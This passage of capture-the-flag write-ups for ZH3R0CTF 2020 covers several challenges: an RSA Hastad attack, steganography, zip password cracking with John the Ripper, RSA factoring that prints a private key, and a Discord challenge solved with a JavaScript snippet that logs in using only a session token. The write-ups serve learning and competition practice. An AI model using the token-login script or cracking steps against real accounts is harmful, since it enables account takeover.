## 14248998542824914719750911379086920493500471888638705238133866311748059581683708422549036932370027910990304631217481702400469486898162095317239864189584616787472445614519498539566076996422644593520710194926830242522562819000277287688504181287249564196723442838873910913236286542856580569459769886968942760506614856615797894115905258930225533376037968554243022975808731677888560753976786112293175192882447689169089532325198116284561341385989363237692683318157037034971649251468292971739244270525145089816866123381203273750512577151312036713011523059957036531932480131619100026838056618714367910138597216504150041537796
## Guessed as decimal input
##

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Decoded Hex :
1ff486017316ddb482dd84be39ff75bba80868b195a1df065bbc83184ba949f68f229da7c1e0a9087fe97189100113cfbe4c1271fc8e2c003d135633095019af55f988f8b790a28ebba20192f28b5fe30417d67cbcede052775c74fa889e22be57ad2519f978ebd34209a621c73024e95bf5ea84ef24d9407a4a010e097e1a903fdefd1b8be92ddd94f47395b6ef5192da1c19f66169729a9a4719abd38c44007af74468c915a936c0f27aeb8ccaf223687ceff1be530c8e0881355f80bc6a576c682d
---------------------------

In Ascii: [random stuff]
```

Hmmmm that didn't work. Maybe we can try to change the value of e to a different
prime? I edited the script to use **5** instead of **3** for **e**. Let's run it
again:
```
$ python ~/tools/RSA-Hastad/rsaHastad.py n1 n2 n3 c1 c2 c3 -v


        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                RSA Hastad Attack
                 JulesDT -- 2016
                 License GNU/GPL
        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
##
## 13696674950433813895298041308045632529884066637106066434055761656634216946840402487500825692707297939337436811238475042408363119793161341988647831099617176608938843866551309386288691680095479772354016097889400273737533478113841958286151723116643033653995679615401212762174200830205198481421530614785072197545914307879082057254025517014619994399588859878772462750995973467253943907234301821576044216582246803850068027473821303077367989380520821734878595978138848610208844611305492117585477951318789794473666584152555731215918034102977914334062154485456843361952486458602554626960263460610725474127818677875972933875249
## Guessed as decimal input
##
##
## 5353345346883089467141269968761525262677279170329666694797265115044928760952816917862665148190263741954651283587445076390324149524694842134461309999700504892826865511676944998156648254220372877253984503837884294212054018245851450555353751434222671390020506217356501583459507087748067302175421725020578101235352346674097473733309611211213878072286974934049276260742702782327298570150180281510979146190959585950244494373491367198797787947700591295353932747947492989216240541566454657386123685140779948477566980018178539683614588716842717894118803413424004986059577548748432511218870669050221814751292921897431242248941
## Guessed as decimal input
##
##
## 14248998542824914719750911379086920493500471888638705238133866311748059581683708422549036932370027910990304631217481702400469486898162095317239864189584616787472445614519498539566076996422644593520710194926830242522562819000277287688504181287249564196723442838873910913236286542856580569459769886968942760506614856615797894115905258930225533376037968554243022975808731677888560753976786112293175192882447689169089532325198116284561341385989363237692683318157037034971649251468292971739244270525145089816866123381203273750512577151312036713011523059957036531932480131619100026838056618714367910138597216504150041537796
## Guessed as decimal input
##

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Decoded Hex :
497473206772656174207468617420796f75206861766520636f6d652074696c6c20686572652e2041732070726f6d69736564206865726520697320796f757220666c61673a207a683372307b5253415f31735f306e335f6f665f7468335f623473745f656e637279707431306e5f42753636797d
---------------------------
As Ascii :
Its great that you have come till here. As promised here is your flag: zh3r0{RSA_1s_0n3_of_th3_b4st_encrypt10n_Bu66y}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
```

### Flag
zh3r0{RSA_1s_0n3_of_th3_b4st_encrypt10n_Bu66y}

### Resources
Video - https://www.youtube.com/watch?v=aS57JCzJw_o

Python Script - https://github.com/JulesDT/RSA-Hastad


---


## (forensics) Katycat
**Category:** Forensics

**Points:** 175

**Description:**
> katycat trying to find the flag but she is lazy. will you help her to find the flag?
>
> **Author:** cryptonic007
>
> **Given:** katy.png

### Writeup
Let's take a peek at what we are working with:
![PNG file](https://github.com/itsecgary/CTFs/blob/master/ZH3R0CTF%202020/Katykat/katy.png)

Welp at least it's a cute cat lol. Next step I like to do is check the contents
of the PNG in a hex editor. I use **HxD** to do this.

**Header:**
```
89 50 4E 47 ---> ‰PNG
```

**Footer:**
```
49 45 4E 44 AE 42 60 82  ---> IEND®B`‚
```

Doesn't look like anything is wrong so far. Next step I like to do is take it to
the CLI and run a few different tools until something hits. I like to use **binwalk**
and **foremost** to try to find hidden files. I also like to use **zsteg** and
**strings** to try to find hidden info.

This time around, we get a hit on **zsteg**:
```
$ zsteg katy.png
b1,rgb,lsb,xy       .. text: "https://pastebin.com/hvgCXNcP"
b2,r,msb,xy         .. file: PGP Secret Key -
b2,rgb,msb,xy       .. text: "EEQPUUU@U"
b2,abgr,msb,xy      .. text: "WSSWCCCCSSWWCC"
b3,bgr,msb,xy       .. text: "(Z0-X0-H"
b4,r,lsb,xy         .. text: "DfffdDB\""
b4,r,msb,xy         .. text: "@\"fa\"DD$DD"
b4,g,lsb,xy         .. text: "D\"\"$\"D\"\"\" "
b4,g,msb,xy         .. text: "&b\"fa\"DD$D\"DDD"
b4,b,lsb,xy         .. text: "vPUFwDT!"
b4,b,msb,xy         .. text: "USUs33UU&\"Q3"
b4,rgb,lsb,xy       .. text: "hDdD\"B$\"\"\"\"dF\"b$$"
b4,rgb,msb,xy       .. text: "QU3sUS53337uSp"
b4,bgr,lsb,xy       .. text: "fdDDB$\"\"\"\"b&Db$\""
b4,bgr,msb,xy       .. text: "Su3S5U3335WsuP"
b4,abgr,msb,xy      .. text: "?U?U?5?5?"
```

Looks like we got a link. Following the trail leads us to a Paste Bin of:
```
UEsDBAoACQAAALq0vFDu3sG8JQAAABkAAAAIABwAZmxhZy50eHRVVAkAA+jvz179789edXgLAAEE
6AMAAAToAwAAt9tbOQhvceVTC9i83YoBgbIW5fmqoaO3mVwXSLOMqNulwvcwb1BLBwju3sG8JQAA
ABkAAABQSwECHgMKAAkAAAC6tLxQ7t7BvCUAAAAZAAAACAAYAAAAAAABAAAApIEAAAAAZmxhZy50
eHRVVAUAA+jvz151eAsAAQToAwAABOgDAABQSwUGAAAAAAEAAQBOAAAAdwAAAAAA
```
This seems to be in Base64 form. After a **base64 decode** I get:
```
PK......
         P%...flag.txt...........
         P%...flag.txt...........
```

I wasn't familiar with this file header at first, but doing some research told
me that this was the header for a ZIP file. I will put a link to file headers
in the *Resources* section at the bottom.

I pasted the contents of what we got above and added the .zip extension. When
trying to open it, we are prompted with a password. I try a few common passwords
just to see, but no luck.

This is where **John the Ripper** comes in handy:
```
$ ~/tools/JohnTheRipper/run/zip2john enc2.zip > hash
ver 1.0 efh 5455 efh 7875 enc2.zip/flag.txt PKZIP Encr: 2b chk, TS_chk, cmplen=37, decmplen=25, crc=BCC1DEEE type=0

$ ~/tools/JohnTheRipper/run/john hash --show
enc2.zip/flag.txt:kitkat:flag.txt:enc2.zip::enc2.zip

1 password hash cracked, 0 left
```

Sweet. Cracked it. Goes with the name of the challenge a little bit too. Opening
the zip file with this password
```
$ unzip enc2.zip
Archive:  enc2.zip
[enc2.zip] flag.txt password:
 extracting: flag.txt

$ cat flag.txt
K9bC_L`D?f0DEb8c?_06cDJN
```

Not there yet, but pretty close. After a little shuffling around with ciphers, I
figured out this was a ROT-47 shift cipher. Similar to the ROT-13, but with a
bigger charset. I wrote a script to do this, but there is an amazing online tool
called **CyberChef** that can do this for us.

Here is my script:
```
from  pwn import *

ct = open("flag.txt", "r").read()

arr = []
for c in ct:
    arr.append(ord(c))

flag = ""
for a in arr:
    val = a + 47
    if val > 126:
        val = 32 + (val - 126)
    flag += chr(val)

log.success("Flag: {}".format(flag))
```

**Output:**
```
$ python3 shift.py
[+] Flag: zh3r0{1sn7_st3g4n0_e4sy}
```

### Flag
zh3r0{1sn7_st3g4n0_e4sy}

### Resources
File Headers - https://www.garykessler.net/library/file_sigs.html

John The Ripper Wiki - https://en.wikipedia.org/wiki/John_the_Ripper

John The Ripper Tips - https://www.varonis.com/blog/john-the-ripper/

CyberChef - https://gchq.github.io/CyberChef/


---


## (forensics) LSB Fun
**Category:** Forensics

**Points:** 230

**Description:**
> have you ever heard of LSB :) ?
>
> **Author:** h4x5p4c3
>
> **Given:** chall.jpg

### Writeup
For those who don't know, LSB (Least Significant Bit) is the process of encoding
data in images such as PNGs, JPG/JPEGs, BMPs, and more. I will provide links
down below that explain LSB more if you haven't quite grasped it.

To sum it all up, LSB is taking the pixels of the image and setting the last bit
of either the Red, Green, or Blue values to 1. This will either change one of
the color values of pixels in the image by 1 or by nothing at all. This ultimately
doesn't change the image in the slightest. You could encode the message in the
image and the image would look the same as it did before.  

For JPEG LSB encoding, **jsteg** is a nice tool that will reveal the hidden
information.

**Requirement:** go (takes a little to install)
```
sudo apt install golang-go
```

**Install Jsteg**
```
go get lukechampine.com/jsteg
```

Running this on our image just straight up gives us our flag. How neat!
```
$ jsteg reveal chall.jpg
zh3r0{j5t3g_i5_c00l}
```

### Flag
zh3r0{j5t3g_i5_c00l}

### Resources
[jsteg](https://github.com/lukechampine/jsteg)

[LSB stego](https://itnext.io/steganography-101-lsb-introduction-with-python-4c4803e08041)

[Encodings](https://alchitry.com/blogs/tutorials/encodings)


---


## (crypto) Mix
**Category:** Crypto

**Points:** 330

**Description:**
> At the BASEment no. 65536, A man is irritated with SHIFT key in his KEYBOARD
as it's a sticky key, A kid is having chocolate icecream with a SPOON.
>
> **Author:** Whit3_D3vi1
>
> **Given:** flag.txt && chall_encrypted.txt

### Writeup
I opened `flag.txt` and got absolutely pwned :(
```
If you opened this then you are a n00b
```

From the hint, we can see that the uppercase letters are telling us something.
It seems this encrypted text is in base65536. [Here](https://www.better-converter.com/Encoders-Decoders/Base65536-Decode)
is a link to a decoder. After decoding, we get the following output:
```
flag 1:
Yjod od s lrunpstf djogy vo[jrtyrcy jrtr od upi g;sh xj4t-}U-i+dit4+

flag 2:
3030313130313030203031313130303130203030313130303131203031303131313131203030313130313030203031313130313131203030313130303131203031313130303131203030313130303030203031313031313031203030313130303131203031303131313131203031313130313131203031313031303031203030313130313131203031313031303030

flag 3:
MTExMTExMTExMTAwMTAwMDEwMTAxMDExMTAxMDExMTExMTEwMTAxMTExMTExMTExMDExMDExMDExMDExMDAwMDAxMTAxMDAxMDAxMDAxMDAwMDAwMDAwMDAwMDAwMDAwMTAxMDAxMTAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMTAxMDAwMDAwMDAwMDAwMTAxMDAwMTAxMDAxMDAwMTAxMDAxMTExMTExMTAwMTAxMDAxMDExMTExMTExMTAwMTAxMDAxMTAwMDAwMDAwMDAwMDAwMTAxMDAxMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMTAxMDExMTExMTExMTExMTExMTExMTExMDAxMDEwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAxMDEwMDAwMDAwMDAxMDEwMDExMDAwMDAwMDAxMDEwMDAxMDEwMTExMTAwMTAxMDAxMDExMTExMTExMTExMTExMTExMTExMDAxMDEwMDExMDExMDExMTExMTExMTExMTAwMTAxMA==
```

Looks like we know what to do now!

**Flag 1:** [Keyboard Shift Cipher](https://www.dcode.fr/keyboard-shift-cipher)
```
# After plugging and chugging
zh3r0{Y0u_sur3_
```

**Flag 2:** [Hex -> Binary -> ASCII]("https://gchq.github.io/CyberChef/#recipe=From_Hex('None')From_Binary('Space'))
```
# Hex to Binary
00110100 01110010 00110011 01011111 00110100 01110111 00110011 01110011 00110000 01101101 00110011 01011111 01110111 01101001 00110111 01101000

# Binary to ASCII
4r3_4w3s0m3_wi7h
```

**Flag 3:** [Spoon Cipher](https://www.dcode.fr/spoon-language)
```
_411_7h3_ski115}
```

Combining the flags together gives us the flag.

### Flag
zh3r0{Y0u_sur3_4r3_4w3s0m3_wi7h_411_7h3_ski115}
*props to [birch](https://github.com/aldenschmidt) for helping me out on this one*


---


## (crypto) RSA-Warmup
**Category:** Crypto

**Points:** 20

**Description:**
> RSA is one of the first public-key cryptosystems and is widely used for secure
data transmission. In such a cryptosystem, the encryption key is public and distinct
from the decryption key which is kept secret.
> You all know this :p
> here is a warmup question.
>
> nc crypto.zh3r0.ml 8451
>
> **Author :** Finch


### Writeup
Right away, I connect to *crypto.zh3r0.ml* on *8451*:
```
$ nc crypto.zh3r0.ml 8451
N: 377527856297171022669430056458716981263384258911465530298564047397682287642100531751631168955623627172831784659749005505789640040456392136544756565404399136372321247852095482514289004599548556755136227142622582929120287466843804001721473294727815058414197945673495141542166225440016738784813546536980135143334440970683
e 65537
CT: 95948178426011852526092427535011433312244071609714551743388577712830026414291835888189885830916269208524310224012724690007902199693329646995676301990765789834069875091787078165512725155603953938812696365285032576235285424419104188074925160749412987648492099796143791507498570035439690972646885220025246628999734089438
```

Looks like we get the public key information and the ciphertext. Simple enough.
Our goal here is to retrieve the private key from this information. Well, the
value we really want the private exponent - **d**.

A tool I always like to use for RSA challenges is **RsaCtfTool** (you can find a
link under *Resources*). We can pass in our modulus (**n**) and public exponent - **e**
and have it run through the attacks. The *--private* option indicates we want to
extract the private key and the *--dumpkey* option dumps the information we want
found from the private key extracted. That is, assuming we successfully
extract the private key.

Here is the command I used:
```
$ ~/tools/RsaCtfTool/RsaCtfTool.py -n 377527856297171022669430056458716981263384258911465530298564047397682287642100531751631168955623627172831784659749005505789640040456392136544756565404399136372321247852095482514289004599548556755136227142622582929120287466843804001721473294727815058414197945673495141542166225440016738784813546536980135143334440970683 -e 65537 --private --dumpkey
```

**Output:**
```
[*] Testing key /tmp/tmp6ccy5el8.
[*] Performing boneh_durfee attack on /tmp/tmp6ccy5el8.
[*] Performing comfact_cn attack on /tmp/tmp6ccy5el8.
[*] Performing cube_root attack on /tmp/tmp6ccy5el8.
[*] Performing ecm attack on /tmp/tmp6ccy5el8.
[*] ECM Method can run forever and may never succeed, timeout set to 30sec. Hit Ctrl-C to bail out.
[*] Performing ecm2 attack on /tmp/tmp6ccy5el8.
[*] ECM2 Method can run forever and may never succeed, timeout set to 30sec. Hit Ctrl-C to bail out.
[*] Performing factordb attack on /tmp/tmp6ccy5el8.

Results for /tmp/tmp6ccy5el8:

Private key :
-----BEGIN RSA PRIVATE KEY-----
MIICMAIBAAKBhH0sgDnDQ1mkNuUnZO/mpoyDR4g75cI6VYtbA4pXLtfgJVnD4lep
6qT//hwsoqi2fgAZ3dyqj+shvwZ3q/w0OA1P6dGPVREz65H3WRxlkqXhbm8LIz2O
RG8+aiXtGuKOcP7U4gN/vdUv/Ma+loHW9nH4EXb3MUtVex8YHlDCGoOinu2puwID
AQABAoGESKHl1Uc9GEbSh7BtlDlcsY3sf+/hK0HBF7iUhMLWreXpJgNHjr3Odzx5
WQZBXzpwOsqreCqYpF+KeW+GUVYuUy8+wNOrHDNd7h7tvkewyp6b4lSani14jhtX
yyfcuUIxW+dEXWQmZScR2hHCmv+7moyKhErMn6DC8vy/Rqjoio9PXf8hAgUA1L0y
zwKBgQCWoNGhjoAaFWOI78WpjnlCfL9F6R/LtDPvODWGiZozKkCT4bl41uS7tk5f
TfQSZHsDXRz5M3rxRzdw8VupI1y7YtrfkZ9KH80PAdDxFhrrKxWmBqOCxVW5kQkR
8BRJ4ZQRxV0blUJfEkm0/VLCUE7VsESlhOXZLG3ySESDznZFVQIECkYc1wKBgGAP
cYFJgpKf31leKD2I2fY33je0g42Cf7horWH+cTN+F673vjO9QCQiEHshGK1+HSE5
CZg3Z4ll9Ip3sg/8uE/crF713JMGEt0mOFz3zvT5BhZal353YMM2JoWlCRtQ3AA1
ULqdhrVg0Va2U0gOtSf8ANtaFMdaWUexJNi2G6D9AgRh9WJR
-----END RSA PRIVATE KEY-----
n: 377527856297171022669430056458716981263384258911465530298564047397682287642100531751631168955623627172831784659749005505789640040456392136544756565404399136372321247852095482514289004599548556755136227142622582929120287466843804001721473294727815058414197945673495141542166225440016738784813546536980135143334440970683
e: 65537
d: 219061435757608963852907672365350121299489108161668187742617152085491396400767315113244112175489996960042494385717319659862230149219931086843159575463511365277827147675298287172908252862749761614617624713298567307138000590141729337640164470545650707611179689947921461153334557400166620309314271542064731256728948965153
p: 3569169103
q: 105774718261414643504894773952859969398705247872775147212901346074910894364004173593125259370940942265808856706263212742427923018041544482277436257803557237722821688298161725545534905578708456267597648522685472470627370962883683799983145067231020199273028937702729839399869484256268016557693917294055466091861
```

Nice! Looks like we extracted our private exponent. Here is a small python
snippet to get the plaintext.
```
from pwn import *
from Crypto.Util.number import long_to_bytes

n = 377527856297171022669430056458716981263384258911465530298564047397682287642100531751631168955623627172831784659749005505789640040456392136544756565404399136372321247852095482514289004599548556755136227142622582929120287466843804001721473294727815058414197945673495141542166225440016738784813546536980135143334440970683
d = 219061435757608963852907672365350121299489108161668187742617152085491396400767315113244112175489996960042494385717319659862230149219931086843159575463511365277827147675298287172908252862749761614617624713298567307138000590141729337640164470545650707611179689947921461153334557400166620309314271542064731256728948965153
c = 95948178426011852526092427535011433312244071609714551743388577712830026414291835888189885830916269208524310224012724690007902199693329646995676301990765789834069875091787078165512725155603953938812696365285032576235285424419104188074925160749412987648492099796143791507498570035439690972646885220025246628999734089438

m = pow(c,d,n)
flag = long_to_bytes(m).decode("utf-8")
log.success("Flag: {}".format(flag))
```

I use log.success() from *pwntools* cause it satisfies me to see the green plus
so no hate.

**Output:**
```
$ python3 rsa_warmup.py
[+] Flag: zh3r0{RSA_1s_Fun}
```

### Flag
zh3r0{RSA_1s_Fun}

### Resources
RsaCtfTool - https://github.com/Ganapati/RsaCtfTool

RSA - https://en.wikipedia.org/wiki/RSA_(cryptosystem)


---


## (web) Tokens
**Category:** Web

**Points:** 50

**Description:**
>The flag was sent by Mr.4N0NYM4U5 to my victim. But i dont have the username
and password of the victim to login into the discord account. The only thing i
have is a god damn token. Can you help me to get the flag. Ill give you the
token and it is all you need.
>
> **Token:** NzIyMzM1MTQ5NDA0MTkyODIw.XunLaw.xASADEeu9iXsYf1wqTFOil_jgfo
>
> **Author:** Mr.4N0NYM4U5

### Writeup
We weren't able to solve this challenge for a while due to the pure confusion of
what was given to us. Originally, we saw this as a JWT token, when put into
https://jwt.io, it wasn't giving anything useful.

After some thinking, we thought: "Wait...are we able to login to Discord using a
token?" Sure enough, we were on the right track. I found a video that shows the
process and even gives us the JavaScript code.

Basically, all we need to do is copy and paste the JS Code into the console in
Google Developer Tools and call the function with the token.
```
function login(token) {
    setInterval(() => {document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`}, 50);
    setTimeout(() => {location.reload();}, 2500);
}
```
```
> login('NzIyMzM1MTQ5NDA0MTkyODIw.XunLaw.xASADEeu9iXsYf1wqTFOil_jgfo')
```

After this, I had to refresh the page and click on *Open* in the top right
corner of https://discord.com. This broght me to the page and we can see that
our name has the flag in it. Not only that, but my favorite doctor/teacher/astronaut/physicist/hacker
was the profile picture!

[PNG of discord chat](https://github.com/itsecgary/CTFs/tree/master/ZH3R0CTF%202020/Tokens/screenshot.PNG)

### Flag
zh3r0{1et_7he_F0rce_8e_With_YoU}

### Resources
Video - https://www.youtube.com/watch?v=FmXMGCRpw50

JS Code - https://pastebin.com/yPWZGzGB


---


## (web) Web-Warmup
**Category:** Web

**Points:** 50

**Description:**
> Chall Link : http://web.zh3r0.ml:8080/
>
> Easy peasy.
>
> **Author:** careless_finch

### Writeup
After opening developer tools for Chrome, we can do some digging and find the
flag in the CSS file.

[PNG of website](https://github.com/itsecgary/CTFs/tree/master/ZH3R0CTF%202020/Web-Warmup/screenshot.PNG)

## Flag
`zh3r0{y3s_th1s_1s_w4rmup}`


